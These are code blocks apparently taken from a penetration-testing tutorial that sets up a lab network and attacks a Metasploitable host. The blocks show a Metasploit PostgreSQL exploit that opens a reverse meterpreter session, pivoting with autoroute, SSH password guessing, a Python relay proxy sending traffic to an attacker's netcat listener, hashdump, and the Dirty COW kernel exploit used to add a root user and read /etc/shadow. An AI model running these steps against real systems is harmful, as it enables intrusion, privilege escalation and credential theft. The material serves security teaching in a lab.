["```\n   msadmin@metasploitable:~# sudo vim /etc/network/interface\n\n   # This file describes the network interfaces available on your system\n\n   # and how to activate them. For more information, see interfaces(5).\n\n   # The loopback network interface\n\n   auto lo\n\n   iface lo inet loopback\n\n   # The primary network interface\n\n   auto eth0\n➊ iface eth0 inet dhcp\n\n   # The secondary network interface\n\n   auto eth1\n➋ iface eth1 inet static\n➌ address 10.0.0.1\n➍ netmask 255.255.255.0\n```", "```\nmsadmin@metasploitable:~# sudo ip link set dev eth1 up\n```", "```\nmsadmin@metasploitable:~# sudo /etc/init.d/networking restart\n```", "```\nvictim@ubuntu:~$ sudo apt-get install openssh-server\nvictim@ubuntu:~$ sudo systemctl enable ssh\n```", "```\nvictim@ubuntu:~$ ping 10.0.0.1\nPING 10.0.0.1 (10.0.0.1): 56 data bytes\n\n64 bytes from 10.0.0.1: icmp_seq=0 ttl=115 time=15.049 ms\n\n64 bytes from 10.0.0.1: icmp_seq=1 ttl=115 time=14.385 ms\n64 bytes from 10.0.0.1: icmp_seq=2 ttl=115 time=15.036 ms\n\n64 bytes from 10.0.0.1: icmp_seq=3 ttl=115 time=22.304 ms\n\n64 bytes from 10.0.0.1: icmp_seq=4 ttl=115 time=23.752 ms\n\n64 bytes from 10.0.0.1: icmp_seq=5 ttl=115 time=14.254 ms\n\n64 bytes from 10.0.0.1: icmp_seq=6 ttl=115 time=14.321 ms\n\n^C\n\n--- 10.0.0.1 ping statistics ---\n\n7 packets transmitted, 7 packets received, 0.0% packet loss\nround-trip min/avg/max/stddev = 14.254/17.014/23.752/3.835 ms\n```", "```\nkali@kali:~$ sudo msfconsole\n```", "```\nmsf6 > use exploit/linux/postgres/postgres_payload\n\n[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp\n```", "```\nmsf6 exploit(linux/postgres/postgres_payload) > set RHOST 192.168.1.101\nRHOST => 192.168.1.101\nmsf6 exploit(linux/postgres/postgres_payload) > run\n\n[*] Started reverse TCP handler on 192.168.1.115:4444\n\n[*] 192.168.1.112:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC .....\n[*] Uploaded as /tmp/VfnRAqLD.so, should be cleaned up automatically\n[*] Sending stage (976712 bytes) to 192.168.1.101\n[*] Meterpreter session 1 opened (192.168.1.115:4444 -> 192.168.1.101:52575) at .....\nmeterpreter >\n```", "```\n   meterpreter > ipconfig\n\n   ...\n➊ Interface  3\n\n   ============\n\n   Name         : eth1\n\n   Hardware MAC : 08:00:27:d1:f1:26\n\n   MTU          : 1500\n\n   Flags        : UP,BROADCAST,MULTICAST\n➋ IPv4 Address : 10.0.0.1\n\n   IPv4 Netmask : 255.255.255.0\n\n   IPv6 Address : fe80::a00:27ff:fed1:f126\n\n   IPv6 Netmask : ffff:ffff:ffff:ffff::\n```", "```\nmeterpreter > run autoroute -s 10.0.0.1/24\nmeterpreter > background\n\n[*] Backgrounding session 1...\nmsf6 exploit(linux/postgres/postgres_payload) > back\n```", "```\nvictim 1234\nuser1 trustno1\n```", "```\nmsf6 > use auxiliary/scanner/ssh/ssh_login\nmsf6 auxiliary(scanner/ssh/ssh_login)>set RHOST 10.0.0.15\nRHOST => 10.0.0.15\nmsf6 auxiliary(scanner/ssh/ssh_login)>set USERPASS_FILE /home/kali/Desktop/Ubuntu_passwords.txt\nUSERPASS_FILE => /home/kali/Desktop/Ubuntu_passwords.txt\nmsf6 auxiliary(scanner/ssh/ssh_login)>run\n```", "```\nmsf6 auxiliary(scanner/ssh/ssh_login) > sessions -l\nActive sessions\n\n===============\n\n  Id  Type                        Connection\n\n  --  ----                        ----------\n\n   1  meterpreter x86/linux       192.168.1.115:4444 -> 192.168.1.112:41206 (192.168.1.112)\n\n   2  shell linux                 192.168.1.115-192.168.1.112:59953 -> 10.0.0.15:22 (10.0.0.15)\n```", "```\nmsf6 > sessions 2\n\n[*] Starting interaction with 2...\nls\nDesktop\nDocuments\nDownloads\n```", "```\nfrom SocketServer import BaseRequestHandler, TCPServer\nfrom socket import socket, AF_INET, SOCK_STREAM\nimport sys\nclass SockHandler(BaseRequestHandler):\n\n   ➊ def handle(self):\n\n        self.data = self.request.recv(1024)\n\n        print \"Passing data from: \"+ str(self.client_address[0]) + \" to \" + external_LAN_IP\n\n        print self.data\n\n        socket = socket(AF_INET, SOCK_STREAM)\n\n        try:\n\n        ➋   socket.connect((external_LAN_IP, external_LAN_PORT))\n\n             socket.sendall(self.data)\n\n             while 1:\n\n                 command = socket.recv(1024)\n\n                 if not command:\n\n                     break\n\n                 self.request.sendall(command)\n\n         finally:\n\n             socket.close()\n\nif __name__ == '__main__':\n\n      private_LAN_IP, private_LAN_PORT, external_LAN_IP, external_LAN_PORT = sys.argv[1:]\n\n   ➌ myserver = TCPServer((private_LAN_IP, private_LAN_PORT), SockHandler)\n\n      myserver.serve_forever()\n```", "```\nkali@kali:~$ nc -lvp 5050\n```", "```\nmsfadmin@metasploitable:~$ python3 proxy.py 10.0.0.1 4040 <Kali IP address> 5050\n```", "```\nvictim@ubuntu:~$ nc 10.0.0.1 4040\n```", "```\nkali@kali:~$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\n```", "```\nusername:has_password:user_id:group_id:user_info:shell_path\n```", "```\nmsfadmin@metasploitable:~$ ls -l /etc/shadow\n\n-rw-r-----  1 root     shadow   1233 2042-05-20 17:30 shadow\n```", "```\nunix-privesc-check standard\n```", "```\nmeterpreter > getsystem\n```", "```\nmeterpreter > run hashdump\n```", "```\nmsfadmin@metasploitable:~$ whoami\nmsfadmin\nmsfadmin@metasploitable:~$ uname -a\nLinux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux\n```", "```\nkali@kali:~$ searchsploit Linux Kernel 2.6.24\n\n------------------------------------------------ -----------------------\nExploit Title                                   |  Path\n\n------------------------------------------------ -----------------------\nLinux Kernel (Solaris 10 / < 5.10 138888-01) -  | solaris/local/15962.c\nLinux Kernel 2.4.1 < 2.4.37 / 2.6.1 < 2.6.32-rc | linux/local/9844.py\n\n...\nLinux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/se | linux/local/40847.cpp\nLinux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_P | linux/local/40838.c\nLinux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE | linux/local/40839.c\n```", "```\nkali@kali:~$ searchsploit -p 40839\n\n  Exploit: Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race\n\n\t\t\t Condition Privilege Escalation (/etc/passwd Method)\n\n     URL: https://www.exploit-db.com/exploits/40839\n\n     Path: /usr/share/exploitdb/exploits/linux/local/40839.c\nFile Type: C source, ASCII text, with CRLF line terminators\n```", "```\nkali@kali:~/$ scp /usr/share/exploitdb/exploits/linux/local/40839.c msfadmin@192.168.1.101:~/\n```", "```\nmsfadmin@metasploitable:~$ gcc -pthread 40839.c -o kernelexploit -lcrypt\n```", "```\nmsfadmin@metasploitable:~$ ./kernelexploit\n\n/etc/passwd successfully backed up to /tmp/passwd.bak\nPlease enter the new password: 147\nComplete line:\nfirefart:fibyOYsv7UnQ6:0:0:pwned:/root:/bin/bash\n\nmmap: b7fa7000\nmadvise 0\n\nptrace 0\nDone! Check /etc/passwd to see if the new user was created.\nYou can log in with the username 'firefart' and the password '147'.\n```", "```\nmsfadmin@metasploitable:~$ su firefart\nPassword:\n```", "```\nfirefart@metasploitable:/home/msfadmin# cat /etc/shadow\nroot:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::\ndaemon:*:14684:0:99999:7:::\nbin:*:14684:0:99999:7:::\nsys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::\n\n...\n```", "```\nmsfadmin@metasploitable:~$ echo 1 > /proc/sys/net/ipv4/ip_forward\n```", "```\nmsfadmin@metasploitable:~$ iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o eth1 -j MASQUERADE\n```", "```\nvictim@ubuntu:~$ ping 192.168.1.1\n```"]